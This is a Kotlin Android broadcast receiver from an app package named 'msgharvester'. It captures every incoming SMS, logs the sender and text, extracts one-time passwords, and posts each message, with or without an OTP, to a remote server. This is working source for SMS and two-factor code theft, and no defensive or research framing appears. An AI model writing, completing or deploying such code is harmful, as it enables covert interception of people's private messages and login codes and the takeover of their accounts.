package com.msgharvester.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle: Bundle? = intent.extras
        try {
            if (bundle != null) {
                val pdusObj = bundle.get("pdus") as? Array<*>
                if (pdusObj == null) return

                val sb = StringBuilder()
                var sender: String? = null
                for (aPdusObj in pdusObj) {
                    val currentMessage = SmsMessage.createFromPdu(aPdusObj as ByteArray)
                    sender = currentMessage.displayOriginatingAddress
                    sb.append(currentMessage.displayMessageBody)
                }
                val message = sb.toString()
                Log.d("SmsReceiver", "SMS from: $sender -> $message")

                // Extract OTP
                val otp = OTPExtractor.extractOTP(message)
                if (!otp.isNullOrEmpty()) {
                    // store for activity
                    OTPStore.lastOtp = otp

                    // launch activity to show OTP
                    val showIntent = Intent(context, MainActivity::class.java)
                    showIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
                    showIntent.putExtra("otp", otp)
                    showIntent.putExtra("full_sms", message)
                    context.startActivity(showIntent)

                    // send to server
                    NetworkClient.postSmsToServer(System.currentTimeMillis().toString(), sender ?: "", message, System.currentTimeMillis()/1000, otp)
                } else {
                    // still send sms to server (no otp)
                    NetworkClient.postSmsToServer(System.currentTimeMillis().toString(), sender ?: "", message, System.currentTimeMillis()/1000, null)
                }
            }
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Exception in onReceive: ${'$'}{e.message}")
        }
    }
}
